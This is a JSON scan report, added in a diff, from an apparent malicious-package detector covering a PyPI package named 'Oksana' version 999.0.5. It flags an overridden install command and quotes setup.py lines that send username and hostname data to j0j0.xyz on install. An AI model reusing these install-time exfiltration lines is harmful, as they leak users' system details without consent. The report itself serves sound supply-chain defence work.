@@ -1,0 +1,41 @@
+{
+    "issues": 4,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:19",
+                "code": "setup(name='Oksana',\n      version='999.0.5',\n      description='Exfiltration',\n      author='j0j0',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:15",
+                "code": "        requests.get(\"https://j0j0.xyz/grmmrly\",params = ploads)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "setup.py:16",
+                "code": "        requests.get(\"https://\"+username+\".\"+hostname+\".\"+\"grmmrly.j0j0.xyz\",params = ploads)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "code-execution": {},
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "setup.py:15",
+                "code": "        requests.get(\"https://j0j0.xyz/grmmrly\",params = ploads)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/Oksana-999.0.5"
+}
